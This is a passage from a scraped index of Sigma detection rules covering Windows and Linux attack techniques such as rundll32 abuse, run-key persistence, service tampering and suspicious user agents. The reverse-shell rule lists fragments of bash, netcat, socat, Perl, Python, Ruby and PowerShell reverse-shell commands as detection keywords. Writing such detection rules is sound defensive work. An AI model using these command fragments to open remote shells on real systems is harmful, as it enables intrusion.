attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbas_replace.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"Suspicious Replace.exe Execution"},{"categories":null,"contents":"Detects suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell\nKnown false-positives Unknown References https://alamot.github.io/reverse_shells/ Raw rule (edit) title: Suspicious Reverse Shell Command Line id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab status: test description: Detects suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell author: Florian Roth references: - https://alamot.github.io/reverse_shells/ date: 2019/04/02 modified: 2021/11/27 logsource: product: linux detection: keywords: - \u0026#39;BEGIN {s = \u0026#34;/inet/tcp/0/\u0026#39; - \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026#39; - \u0026#39;bash -i \u0026gt;\u0026amp; /dev/udp/\u0026#39; - \u0026#39;sh -i \u0026gt;$ /dev/udp/\u0026#39; - \u0026#39;sh -i \u0026gt;$ /dev/tcp/\u0026#39; - \u0026#39;\u0026amp;\u0026amp; while read line 0\u0026lt;\u0026amp;5; do\u0026#39; - \u0026#39;/bin/bash -c exec 5\u0026lt;\u0026gt;/dev/tcp/\u0026#39; - \u0026#39;/bin/bash -c exec 5\u0026lt;\u0026gt;/dev/udp/\u0026#39; - \u0026#39;nc -e /bin/sh \u0026#39; - \u0026#39;/bin/sh | nc\u0026#39; - \u0026#39;rm -f backpipe; mknod /tmp/backpipe p \u0026amp;\u0026amp; nc \u0026#39; - \u0026#39;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i))))\u0026#39; - \u0026#39;;STDIN-\u0026gt;fdopen($c,r);$~-\u0026gt;fdopen($c,w);system$_ while\u0026lt;\u0026gt;;\u0026#39; - \u0026#39;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#39; - \u0026#39;uname -a; w; id; /bin/bash -i\u0026#39; - \u0026#39;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};\u0026#39; - \u0026#39;;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\u0026#39;\u0026#39;HISTFILE\u0026#39;\u0026#39;,\u0026#39;\u0026#39;/dev/null\u0026#39;\u0026#39;);\u0026#39; - \u0026#39;.to_i;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,f,f,f)\u0026#39; - \u0026#39;;while(cmd=c.gets);IO.popen(cmd,\u0026#34;r\u0026#34;){|io|c.print\u0026#39; - \u0026#39;socat exec:\u0026#39;\u0026#39;bash -li\u0026#39;\u0026#39;,pty,stderr,setsid,sigint,sane tcp:\u0026#39; - \u0026#39;rm -f /tmp/p; mknod /tmp/p p \u0026amp;\u0026amp;\u0026#39; - \u0026#39; | /bin/bash | telnet \u0026#39; - \u0026#39;,echo=0,raw tcp-listen:\u0026#39; - \u0026#39;nc -lvvp \u0026#39; - \u0026#39;xterm -display 1\u0026#39; condition: keywords falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_shell_susp_rev_shells.yml/","tags":["attack.execution","attack.t1059.004"],"title":"Suspicious Reverse Shell Command Line"},{"categories":null,"contents":"Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories\nKnown false-positives Software installers downloaded and used by users References https://app.any.run/tasks/c5bef5b7-f484-4c43-9cf3-d5c5c7839def/ Raw rule (edit) title: Suspicious Run Key from Download id: 9c5037d1-c568-49b3-88c7-9846a5bdc2be status: test description: Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories author: Florian Roth references: - https://app.any.run/tasks/c5bef5b7-f484-4c43-9cf3-d5c5c7839def/ date: 2019/10/01 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: Image|contains: - \u0026#39;\\Downloads\\\u0026#39; - \u0026#39;\\Temporary Internet Files\\Content.Outlook\\\u0026#39; - \u0026#39;\\Local Settings\\Temporary Internet Files\\\u0026#39; TargetObject|contains: \u0026#39;\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\u0026#39; condition: selection falsepositives: - Software installers downloaded and used by users level: high tags: - attack.persistence - attack.t1547.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_susp_download_run_key.yml/","tags":["attack.persistence","attack.t1547.001"],"title":"Suspicious Run Key from Download"},{"categories":null,"contents":"Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452\nKnown false-positives Unknown References https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/ Raw rule (edit) title: Suspicious Rundll32 Activity Invoking Sys File id: 731231b9-0b5d-4219-94dd-abb6959aa7ea description: Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452 status: experimental references: - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/ tags: - attack.defense_evasion - attack.t1218.011 author: Florian Roth date: 2021/03/05 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: \u0026#39;rundll32.exe\u0026#39; selection2: CommandLine|contains: - \u0026#39;.sys,\u0026#39; - \u0026#39;.sys \u0026#39; condition: selection1 and selection2 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_rundll32_sys.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"Suspicious Rundll32 Activity Invoking Sys File"},{"categories":null,"contents":"Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452\nKnown false-positives Unknown References https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/ Raw rule (edit) title: Suspicious Rundll32 Invoking Inline VBScript id: 1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd description: Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452 status: experimental references: - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/ author: Florian Roth date: 2021/03/05 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;rundll32.exe\u0026#39; - \u0026#39;Execute\u0026#39; - \u0026#39;RegRead\u0026#39; - \u0026#39;window.close\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1055 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_rundll32_inline_vbs.yml/","tags":["attack.defense_evasion","attack.t1055"],"title":"Suspicious Rundll32 Invoking Inline VBScript"},{"categories":null,"contents":"Detects suspicious process related to rundll32 based on arguments\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52 https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md Raw rule (edit) title: Suspicious Rundll32 Script in CommandLine id: 73fcad2e-ff14-4c38-b11d-4172c8ac86c7 status: experimental description: Detects suspicious process related to rundll32 based on arguments author: frack113 references: - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52 - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md date: 2021/12/04 logsource: category: process_creation product: windows detection: selection_run: CommandLine|contains|all: - rundll32 - \u0026#39;mshtml,RunHTMLApplication\u0026#39; selection_script: CommandLine|contains: - \u0026#39;javascript:\u0026#39; - \u0026#39;vbscript:\u0026#39; condition: all of selection_* falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.defense_evasion - attack.t1218.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_rundll32_script_run.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"Suspicious Rundll32 Script in CommandLine"},{"categories":null,"contents":"setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.\nKnown false-positives Scripts and administrative tools that use INF files for driver installation with setupapi.dll References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf https://twitter.com/Z3Jpa29z/status/1313742350292746241?s=20 Raw rule (edit) title: Suspicious Rundll32 Setupapi.dll Activity id: 285b85b1-a555-4095-8652-a8a4106af63f status: test description: setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file. author: Konstantin Grishchenko, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml - https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf - https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf - https://twitter.com/Z3Jpa29z/status/1313742350292746241?s=20 date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\runonce.exe\u0026#39; ParentImage|endswith: \u0026#39;\\rundll32.exe\u0026#39; ParentCommandLine|contains|all: - \u0026#39;setupapi.dll\u0026#39; - \u0026#39;InstallHinfSection\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Scripts and administrative tools that use INF files for driver installation with setupapi.dll level: medium tags: - attack.defense_evasion - attack.t1218.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_rundll32_setupapi_installhinfsection.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"Suspicious Rundll32 Setupapi.dll Activity"},{"categories":null,"contents":"Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity\nKnown false-positives Possible but rare References https://www.cobaltstrike.com/help-opsec Raw rule (edit) title: Suspicious Rundll32 Without Any CommandLine Params id: 1775e15e-b61b-4d14-a1a3-80981298085a description: Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity status: experimental references: - https://www.cobaltstrike.com/help-opsec author: Florian Roth date: 2021/05/27 logsource: category: process_creation product: windows detection: selection: CommandLine|endswith: \u0026#39;\\rundll32.exe\u0026#39; filter1: ParentImage|endswith: \u0026#39;\\svchost.exe\u0026#39; filter2: ParentImage|contains: - \u0026#39;\\AppData\\Local\\\u0026#39; - \u0026#39;\\Microsoft\\Edge\\\u0026#39; condition: selection and not filter1 and not filter2 fields: - ParentImage - ParentCommandLine falsepositives: - Possible but rare level: high tags: - attack.defense_evasion - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_rundll32_no_params.yml/","tags":["attack.defense_evasion","attack.t1202"],"title":"Suspicious Rundll32 Without Any CommandLine Params"},{"categories":null,"contents":"Detects execution of powershell scripts via Runscripthelper.exe\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runscripthelper.yml Raw rule (edit) title: Suspicious Runscripthelper.exe id: eca49c87-8a75-4f13-9c73-a5a29e845f03 status: test description: Detects execution of powershell scripts via Runscripthelper.exe author: Victor Sergeev, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runscripthelper.yml date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: image_path: Image|endswith: \u0026#39;\\Runscripthelper.exe\u0026#39; cmd: CommandLine|contains: \u0026#39;surfacecheck\u0026#39; condition: image_path and cmd fields: - CommandLine falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059 - attack.defense_evasion - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_runscripthelper.yml/","tags":["attack.execution","attack.t1059","attack.defense_evasion","attack.t1202"],"title":"Suspicious Runscripthelper.exe"},{"categories":null,"contents":"Adversaries may try to get information about registered services\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1007/T1007.md#atomic-test-1---system-service-discovery Raw rule (edit) title: Suspicious Sc Query id: 57712d7a-679c-4a41-a913-87e7175ae429 status: experimental description: Adversaries may try to get information about registered services references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1007/T1007.md#atomic-test-1---system-service-discovery author: frack113 date: 2021/12/06 logsource: category: process_creation product: windows detection: sc_query: CommandLine|contains: \u0026#39;sc query\u0026#39; condition: sc_query falsepositives: - unknown level: low tags: - attack.discovery - attack.t1007 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_sc_query.yml/","tags":["attack.discovery","attack.t1007"],"title":"Suspicious Sc Query"},{"categories":null,"contents":"Detects the creation of scheduled tasks that involves a temporary folder and runs only once\nKnown false-positives Administrative activity Software installation References https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3 Raw rule (edit) title: Suspicious Scheduled Task Creation Involving Temp Folder id: 39019a4e-317f-4ce3-ae63-309a8c6b53c5 status: experimental description: Detects the creation of scheduled tasks that involves a temporary folder and runs only once author: Florian Roth date: 2021/03/11 references: - https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\schtasks.exe\u0026#39; CommandLine|contains|all: - \u0026#39; /create \u0026#39; - \u0026#39; /sc once \u0026#39; - \u0026#39;\\Temp\\\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine tags: - attack.execution - attack.persistence - attack.t1053.005 falsepositives: - Administrative activity - Software installation level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_schtask_creation_temp_folder.yml/","tags":["attack.execution","attack.persistence","attack.t1053.005"],"title":"Suspicious Scheduled Task Creation Involving Temp Folder"},{"categories":null,"contents":"Detects a service binary running in a suspicious directory\nKnown false-positives Unknown References https://blog.truesec.com/2021/03/07/exchange-zero-day-proxylogon-and-hafnium/ Raw rule (edit) title: Suspicious Service Binary Directory id: 883faa95-175a-4e22-8181-e5761aeb373c description: Detects a service binary running in a suspicious directory author: Florian Roth date: 2021/03/09 status: experimental references: - https://blog.truesec.com/2021/03/07/exchange-zero-day-proxylogon-and-hafnium/ logsource: category: process_creation product: windows detection: selection: Image|contains: - \u0026#39;\\Users\\Public\\\u0026#39; - \u0026#39;\\$Recycle.bin\u0026#39; - \u0026#39;\\Users\\All Users\\\u0026#39; - \u0026#39;\\Users\\Default\\\u0026#39; - \u0026#39;\\Users\\Contacts\\\u0026#39; - \u0026#39;\\Users\\Searches\\\u0026#39; - \u0026#39;C:\\Perflogs\\\u0026#39; - \u0026#39;\\config\\systemprofile\\\u0026#39; - \u0026#39;\\Windows\\Fonts\\\u0026#39; - \u0026#39;\\Windows\\IME\\\u0026#39; - \u0026#39;\\Windows\\addins\\\u0026#39; ParentImage|endswith: - \u0026#39;\\services.exe\u0026#39; - \u0026#39;\\svchost.exe\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_service_dir.yml/","tags":["attack.defense_evasion","attack.t1202"],"title":"Suspicious Service Binary Directory"},{"categories":null,"contents":"Detects suspicious DACL modifications that can be used to hide services or make them unstopable\nKnown false-positives Unknown References https://www.sans.org/blog/red-team-tactics-hiding-windows-services/ https://docs.microsoft.com/pt-br/windows/win32/secauthz/sid-strings Raw rule (edit) title: Suspicious Service DACL Modification id: 99cf1e02-00fb-4c0d-8375-563f978dfd37 status: test description: Detects suspicious DACL modifications that can be used to hide services or make them unstopable author: Jonhnathan Ribeiro, oscd.community references: - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/ - https://docs.microsoft.com/pt-br/windows/win32/secauthz/sid-strings date: 2020/10/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\sc.exe\u0026#39; CommandLine|contains|all: - \u0026#39;sdset\u0026#39; - \u0026#39;D;;\u0026#39; sids: CommandLine|contains: - \u0026#39;;;;IU\u0026#39; - \u0026#39;;;;SU\u0026#39; - \u0026#39;;;;BA\u0026#39; - \u0026#39;;;;SY\u0026#39; - \u0026#39;;;;WD\u0026#39; condition: selection and sids falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1543.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_service_dacl_modification.yml/","tags":["attack.persistence","attack.t1543.003"],"title":"Suspicious Service DACL Modification"},{"categories":null,"contents":"Detects installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders. Both services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU (https://github.com/hfiref0x/KDU)\nKnown false-positives Other legimate tools using this service names and drivers. Note - clever attackers may easily bypass this detection by just renaming the services. Therefore just Medium-level and don\u0026rsquo;t rely on it. References https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/ Raw rule (edit) title: Suspicious Service Installed id: f2485272-a156-4773-82d7-1d178bc4905b status: test description: Detects installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders. Both services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU (https://github.com/hfiref0x/KDU) author: xknow (@xknow_infosec), xorxes (@xor_xes) references: - https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/ date: 2019/04/08 modified: 2022/01/13 logsource: category: registry_event product: windows detection: selection_1: EventType: SetValue TargetObject: - \u0026#39;HKLM\\System\\CurrentControlSet\\Services\\NalDrv\\ImagePath\u0026#39; - \u0026#39;HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152\\ImagePath\u0026#39; selection_2: Image|endswith: - \u0026#39;\\procexp64.exe\u0026#39; - \u0026#39;\\procexp.exe\u0026#39; - \u0026#39;\\procmon64.exe\u0026#39; - \u0026#39;\\procmon.exe\u0026#39; selection_3: Details|contains: - \u0026#39;\\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS\u0026#39; condition: selection_1 and not selection_2 and not selection_3 falsepositives: - Other legimate tools using this service names and drivers. Note - clever attackers may easily bypass this detection by just renaming the services. Therefore just Medium-level and don\u0026#39;t rely on it. level: medium tags: - attack.t1562.001 - attack.defense_evasion ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_susp_service_installed.yml/","tags":["attack.t1562.001","attack.defense_evasion"],"title":"Suspicious Service Installed"},{"categories":null,"contents":"Detects suspicious shell spawn from WinRM host process\nKnown false-positives Legitimate WinRM usage Raw rule (edit) title: Suspicious Shells Spawn by WinRM id: 5cc2cda8-f261-4d88-a2de-e9e193c86716 description: Detects suspicious shell spawn from WinRM host process status: experimental author: Andreas Hunkeler (@Karneades), Markus Neis date: 2021/05/20 modified: 2021/05/22 tags: - attack.t1190 - attack.initial_access - attack.persistence - attack.privilege_escalation logsource: category: process_creation product: windows detection: selection: ParentImage: \u0026#39;*\\wsmprovhost.exe\u0026#39; Image: - \u0026#39;*\\cmd.exe\u0026#39; - \u0026#39;*\\sh.exe\u0026#39; - \u0026#39;*\\bash.exe\u0026#39; - \u0026#39;*\\powershell.exe\u0026#39; - \u0026#39;*\\schtasks.exe\u0026#39; - \u0026#39;*\\certutil.exe\u0026#39; - \u0026#39;*\\whoami.exe\u0026#39; - \u0026#39;*\\bitsadmin.exe\u0026#39; condition: selection falsepositives: - Legitimate WinRM usage level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_from_winrm.yml/","tags":["attack.t1190","attack.initial_access","attack.persistence","attack.privilege_escalation"],"title":"Suspicious Shells Spawn by WinRM"},{"categories":null,"contents":"A General detection for processes loading System.Drawing.ni.dll. This could be an indicator of potential Screen Capture.\nKnown false-positives unknown References https://github.com/OTRF/detection-hackathon-apt29/issues/16 https://threathunterplaybook.com/evals/apt29/detections/7.A.1_3B4E5808-3C71-406A-B181-17B0CE3178C9.html Raw rule (edit) title: Suspicious System.Drawing Load id: 666ecfc7-229d-42b8-821e-1a8f8cb7057c description: A General detection for processes loading System.Drawing.ni.dll. This could be an indicator of potential Screen Capture. status: experimental date: 2020/05/02 modified: 2021/12/05 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.collection - attack.t1113 references: - https://github.com/OTRF/detection-hackathon-apt29/issues/16 - https://threathunterplaybook.com/evals/apt29/detections/7.A.1_3B4E5808-3C71-406A-B181-17B0CE3178C9.html logsource: product: windows category: image_load detection: selection: ImageLoaded|endswith: \u0026#39;\\System.Drawing.ni.dll\u0026#39; filter: # The number of false positives was too high - we had to do this broader filter # based on the following paths that shouldn\u0026#39;t be writable to an unprivileged user Image|startswith: - \u0026#39;C:\\Program Files\\\u0026#39; - \u0026#39;C:\\Program Files (x86)\\\u0026#39; - \u0026#39;C:\\Windows\\System32\\\u0026#39; - \u0026#39;C:\\Windows\\Microsoft.NET\\\u0026#39; - \u0026#39;C:\\Windows\\ImmersiveControlPanel\\\u0026#39; filter2: Image: - \u0026#39;C:\\Users\\\\*\\AppData\\Local\\NhNotifSys\\nahimic\\nahimicNotifSys.exe\u0026#39; - \u0026#39;C:\\Users\\\\*\\GitHubDesktop\\Update.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\NhNotifSys.exe\u0026#39; condition: selection and not 1 of filter* falsepositives: - unknown level: low # too many false positives ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_system_drawing_load.yml/","tags":["attack.collection","attack.t1113"],"title":"Suspicious System.Drawing Load"},{"categories":null,"contents":"Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model\nKnown false-positives Administrator PowerShell scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md Raw rule (edit) title: Suspicious Task Added by Bitsadmin id: 1ff315dc-2a3a-4b71-8dde-873818d25d39 status: experimental description: | Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md author: frack113 date: 2022/03/01 logsource: product: windows service: bits-client detection: selection: EventID: 3 processPath|endswith: \u0026#39;\\bitsadmin.exe\u0026#39; condition: selection falsepositives: - Administrator PowerShell scripts level: low tags: - attack.defense_evasion - attack.persistence - attack.t1197 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/bits_client/win_bits_client_susp_use_bitsadmin.yml/","tags":["attack.defense_evasion","attack.persistence","attack.t1197"],"title":"Suspicious Task Added by Bitsadmin"},{"categories":null,"contents":"Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model\nKnown false-positives Administrator PowerShell scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md Raw rule (edit) title: Suspicious Task Added by Powershell id: fe3a2d49-f255-4d10-935c-bda7391108eb status: experimental description: | Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md author: frack113 date: 2022/03/01 logsource: product: windows service: bits-client detection: selection: EventID: 3 processPath|endswith: \u0026#39;\\powershell.exe\u0026#39; condition: selection falsepositives: - Administrator PowerShell scripts level: low tags: - attack.defense_evasion - attack.persistence - attack.t1197 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/bits_client/win_bits_client_susp_powershell_job.yml/","tags":["attack.defense_evasion","attack.persistence","attack.t1197"],"title":"Suspicious Task Added by Powershell"},{"categories":null,"contents":"Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)\nKnown false-positives Unknown References https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution Raw rule (edit) title: Suspicious UltraVNC Execution id: 871b9555-69ca-4993-99d3-35a59f9f3599 status: experimental author: Bhabesh Raj date: 2022/03/04 modified: 2022/03/09 description: Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group) references: - https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf - https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution tags: - attack.lateral_movement - attack.g0047 - attack.t1021.005 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;-autoreconnect \u0026#39; - \u0026#39;-connect \u0026#39; - \u0026#39;-id:\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/process_creation_apt_gamaredon_ultravnc.yml/","tags":["attack.lateral_movement","attack.g0047","attack.t1021.005"],"title":"Suspicious UltraVNC Execution"},{"categories":null,"contents":"Detects a usage of the manage-bde.wsf script that may indicate an attempt of proxy execution from script\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712 https://twitter.com/bohops/status/980659399495741441 https://twitter.com/JohnLaTwC/status/1223292479270600706 https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md Raw rule (edit) title: Suspicious Usage of the Manage-bde.wsf Script id: c363385c-f75d-4753-a108-c1a8e28bdbda description: Detects a usage of the manage-bde.wsf script that may indicate an attempt of proxy execution from script status: experimental references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml - https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712 - https://twitter.com/bohops/status/980659399495741441 - https://twitter.com/JohnLaTwC/status/1223292479270600706 - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md tags: - attack.defense_evasion - attack.t1216 date: 2020/10/13 modified: 2021/05/21 author: oscd.community, Natalia Shornikova logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;cscript\u0026#39; - \u0026#39;manage-bde.wsf\u0026#39; condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_manage_bde_lolbas.yml/","tags":["attack.defense_evasion","attack.t1216"],"title":"Suspicious Usage of the Manage-bde.wsf Script"},{"categories":null,"contents":"Detects the execution of CSharp interactive console by PowerShell\nKnown false-positives Possible depending on environment. Pair with other factors such as net connections, command-line args, etc. References https://redcanary.com/blog/detecting-attacks-leveraging-the-net-framework/ Raw rule (edit) title: Suspicious Use of CSharp Interactive Console id: a9e416a8-e613-4f8b-88b8-a7d1d1af2f61 status: test description: Detects the execution of CSharp interactive console by PowerShell author: Michael R. (@nahamike01) references: - https://redcanary.com/blog/detecting-attacks-leveraging-the-net-framework/ date: 2020/03/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\csi.exe\u0026#39; ParentImage|endswith: \u0026#39;\\powershell.exe\u0026#39; OriginalFileName: \u0026#39;csi.exe\u0026#39; condition: selection falsepositives: - Possible depending on environment. Pair with other factors such as net connections, command-line args, etc. level: high tags: - attack.execution - attack.t1127 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_use_of_csharp_console.yml/","tags":["attack.execution","attack.t1127"],"title":"Suspicious Use of CSharp Interactive Console"},{"categories":null,"contents":"Detects suspicious malformed user agent strings in proxy logs\nKnown false-positives Unknown References https://github.com/fastly/waf_testbed/blob/master/templates/default/scanners-user-agents.data.erb Raw rule (edit) title: Suspicious User Agent id: 7195a772-4b3f-43a4-a210-6a003d65caa1 status: experimental description: Detects suspicious malformed user agent strings in proxy logs author: Florian Roth date: 2017/07/08 modified: 2021/08/09 references: - https://github.com/fastly/waf_testbed/blob/master/templates/default/scanners-user-agents.data.erb logsource: category: proxy detection: selection1: c-useragent|startswith: - \u0026#39;user-agent\u0026#39; # User-Agent: User-Agent: - \u0026#39;Mozilla/3.0 \u0026#39; - \u0026#39;Mozilla/2.0 \u0026#39; - \u0026#39;Mozilla/1.0 \u0026#39; - \u0026#39;Mozilla \u0026#39; # missing slash 